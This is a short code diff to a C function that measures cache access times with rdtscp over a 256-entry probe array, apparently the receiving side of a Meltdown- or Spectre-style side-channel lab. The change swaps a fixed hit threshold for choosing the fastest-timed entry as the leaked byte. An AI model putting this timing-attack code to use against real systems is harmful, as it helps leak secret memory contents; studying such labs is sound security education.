@@ -53,17 +53,25 @@ void attackChannel(){
 void attackChannel_x86(){
     register uint64_t time1, time2;
     volatile uint8_t *addr;
+    int min = 10000;
+    int temp, i, k;
 
-    int temp, i;
     for(i=0;i<256;i++){
         time1 = __rdtscp(&temp);
         temp = array[i*4096 + DELTA];
         time2 = __rdtscp(&temp) - time1;
-        if(time2<=CACHE_HIT_THRESHOLD)
-        {
-            printf("array[%d*4096+DELTA]\n", i);
+        // if(time2<=CACHE_HIT_THRESHOLD)
+        // {
+        //     printf("array[%d*4096+DELTA]\n", i);
+        // }
+
+        if(time2<=min){
+            min = time2;
+            k=i;
         }
+        
     }
+    printf("array[%d*4096+DELTA]\n", k);
 }
 
 // Out of order execution
